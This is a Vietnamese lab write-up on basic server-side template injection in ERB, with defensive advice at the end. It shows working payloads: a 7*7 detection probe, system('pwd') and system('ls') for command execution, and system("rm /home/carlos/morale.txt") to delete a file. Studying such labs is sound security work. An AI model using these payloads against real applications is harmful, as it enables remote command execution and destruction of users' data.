# Lab: Basic server-side template injection

## Mục tiêu

Xác nhận SSTI trên tham số `message`, rồi xóa file `morale.txt` trong thư mục home của Carlos.

## Ý tưởng lỗi

Ứng dụng render trực tiếp nội dung từ `message` bằng ERB. Nếu expression được đánh giá trên server, ta có thể thử payload toán học trước, rồi chuyển sang thực thi lệnh.

## Writeup từng bước: từ detect đến exploit

### Bước 1: Tìm điểm render

1. Gửi `GET /product?productId=1`.
2. Quan sát bị điều hướng về `/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`.
3. Suy ra tham số `message` đang được dùng để hiển thị nội dung lên trang chủ.

### Bước 2: Detect SSTI

1. Chèn payload thử nghiệm vào `message`:

`<%= 7*7 %>`

2. Nếu trang trả về `49`, server đang evaluate template expression chứ không chỉ in chuỗi thô.

### Bước 3: Xác nhận mức độ ảnh hưởng

1. Thử kiểm tra thư mục làm việc:

`<%= system('pwd') %>`

2. Kết quả trả về `/home/carlos` cho thấy có thể thực thi lệnh hệ thống.
3. Thử liệt kê file:

`<%= system('ls') %>`

4. Thấy `morale.txt`, xác nhận đúng mục tiêu cần xóa.

### Bước 4: Exploit để solve lab

1. Gửi payload xóa file:

`<%= system("rm /home/carlos/morale.txt") %>`

2. Load lại URL và lab được solve.

## Vì sao detect này đáng tin cậy?

Vì payload toán học `7*7` chỉ có thể được tính nếu ERB đang evaluate expression ở server, còn `system()` chứng minh mức độ nguy hiểm đã vượt qua render đơn thuần và đi tới thực thi lệnh.

## Gợi ý phòng thủ

1. Không render dữ liệu người dùng trực tiếp vào template engine.
2. Tách dữ liệu khỏi logic template, không cho phép expression tự do.
3. Escape/encode đầu vào theo ngữ cảnh trước khi hiển thị.
